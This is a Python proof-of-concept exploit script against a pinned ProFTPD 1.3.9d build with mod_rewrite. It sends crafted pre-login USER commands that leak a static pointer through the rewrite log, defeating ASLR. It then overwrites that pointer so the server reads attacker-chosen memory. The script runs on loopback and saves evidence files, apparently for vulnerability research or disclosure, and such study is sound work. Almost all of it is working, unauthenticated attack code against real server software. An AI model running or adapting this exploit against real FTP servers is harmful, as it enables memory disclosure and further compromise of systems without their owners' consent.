#!/usr/bin/env python3
"""ASLR-on chosen-string readback through the overflowed static substr pointer.

Loopback, %m USER pre-login config (PR:N), real ASLR, plain pinned 1.3.9d build.
No setarch, no fixed address, no PIE-base arithmetic.

1. A 1025-code-point USER key whose first code point is U+00E8 makes the
   strlen-limited pstrdup(map_pool, utf8_val) at mod_rewrite.c:2072 over-read
   the eight bytes of the static substr pointer.  rewrite_subst() logs them in
   `maps subst'd pattern: ...`; the low six bytes are recovered here.
2. A 1281-code-point key writes those bytes back into substr through the
   aliased loops (code points 8k set substr byte k).  The key's other code
   points spell a caller-chosen repeating PAT, so the buffer the pointer aims
   at carries attacker bytes.
3. `USER labuser` triggers another %m USER rewrite; rewrite_parse_map_str()
   dereferences the redirected substr and the real RewriteLog records the
   chosen PAT run in `parsing '...'`.  NOOP/PWD confirm the session survived.

Expected: PAT appears in the wild read in every trial; a marker-free PAT does
not; leaked pointers differ per process (ASLR); SIGNALS 0.
"""
import os
import re
import socket
import subprocess
import time

W = os.path.dirname(os.path.abspath(__file__))
CFG = W + "/etc/proftpd-prelogin-leak.conf"
BIN = W + "/../" + os.environ.get("BIN_NAME", "proftpd-vuln-plain")
LOG = W + "/log/rewrite-prelogin-leak.log"
PORT = 21914
TAG = os.environ.get("TAG", "aslr-marker")
PAT = os.environ.get("PAT", "ZZZZZZZZZZZZZZZZNOOP-ASLR-OK!")
DELTAS = [int(x, 0) for x in os.environ.get("DELTAS", "0").split(",")]


def cmd(s, arg):
    s.sendall(b"USER " + arg + b"\r\n")
    try:
        return s.recv(4096)[:160]
    except OSError:
        return b""


def raw(s, line):
    s.sendall(line + b"\r\n")
    try:
        return s.recv(4096)[:160]
    except OSError:
        return b""


def run_once(delta):
    # Per-trial log and port isolation: a stale parent can append to a truncated
    # RewriteLog or hold the listener and fake a result.
    subprocess.run(["fuser", "-k", LOG], capture_output=True)
    subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
    open(LOG, "wb").close()
    server_out = W + "/log/" + TAG + "-%d.out" % delta
    srv = subprocess.Popen([BIN, "-n", "-c", CFG], cwd=W,
                           stdout=open(server_out, "wb"), stderr=subprocess.STDOUT)
    lines = []
    try:
        for _ in range(80):
            try:
                s = socket.create_connection(("127.0.0.1", PORT), 0.3)
                s.close()
                break
            except OSError:
                time.sleep(0.05)
        s = socket.create_connection(("127.0.0.1", PORT), 8)
        s.settimeout(8)
        s.recv(4096)

        ptr = None
        for length in (1025, 1026, 1027, 1028):
            cmd(s, ("\u00e8" + "A" * (length - 1)).encode("utf-8"))
            for ln in reversed(open(LOG, "rb").read().split(b"\n")):
                m = re.search(rb"maps subst'd pattern: '([^']*)'", ln)
                if m and len(m.group(1)) >= 1025:
                    v = m.group(1)[-6:]
                    if len(v) == 6 and 0x40 <= v[-1] <= 0x7F:
                        ptr = v
                        break
            if ptr:
                break
        if not ptr:
            lines.append("LEAK NONE")
            return lines
        old = int.from_bytes(ptr + b"\x00\x00", "little")
        new = old + delta
        lines.append("PTR_OLD %x PTR_NEW %x DELTA %x" % (old, new, delta))

        ptr8 = new.to_bytes(8, "little")
        cps = [PAT[i % len(PAT)] for i in range(1281)]
        for k in range(8):
            cps[8 * k] = chr(ptr8[k]) if ptr8[k] else "\u0100"
        cmd(s, "".join(cps).encode("utf-8"))
        cmd(s, b"labuser")            # the redirected deref happens here
        noop = raw(s, b"NOOP")
        pwd = raw(s, b"PWD")
        s.close()
        time.sleep(0.15)
        lines.append("NOOP %r" % noop[:60])
        lines.append("PWD %r" % pwd[:60])

        data = open(LOG, "rb").read()
        reads = [m.group(1) for m in re.finditer(rb"parsing '([^']*)'", data)]
        wild = None
        for idx in range(len(reads) - 1, 0, -1):
            if len(reads[idx - 1]) > 1000:
                wild = reads[idx]
                break
        if wild is None:
            lines.append("WILD NONE")
        else:
            lines.append("WILD_LEN %d" % len(wild))
            lines.append("WILD_HEX %s" % wild[:96].hex())
            lines.append("WILD_REPR %r" % wild[:96])
            lin = wild.find(PAT.encode("ascii"))
            lines.append("PAT_HIT %d" % lin)
        lines.append("SIGNALS %d" % open(server_out, "rb").read().count(b"signal 11"))
        return lines
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=3)
        except subprocess.TimeoutExpired:
            srv.kill()
        subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
        with open(W + "/evidence/rewrite-" + TAG + "-%d.log" % delta, "wb") as f:
            f.write(open(LOG, "rb").read())


def main():
    out = W + "/evidence/" + TAG + ".txt"
    lines = ["PAT %r" % PAT, "RANDOMIZE_VA %s" %
             open("/proc/sys/kernel/randomize_va_space").read().strip()]
    for delta in DELTAS:
        lines.append("--- DELTA %x ---" % delta)
        lines.extend(run_once(delta))
    with open(out, "w") as f:
        f.write("\n".join(lines) + "\n")
    print("\n".join(lines))


if __name__ == "__main__":
    main()
